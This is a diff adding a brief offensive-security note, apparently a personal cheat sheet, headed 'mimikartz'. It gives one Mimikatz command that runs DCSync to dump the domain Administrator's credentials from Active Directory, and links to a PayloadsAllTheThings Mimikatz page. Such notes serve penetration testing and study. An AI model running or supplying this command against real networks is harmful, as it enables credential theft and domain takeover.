@@ -1,0 +1,5 @@
+mimikartz
+
+./mimikatz.exe "LSADUMP::DCSync /user:Administrator" "exit"
+
+[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Mimikatz.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
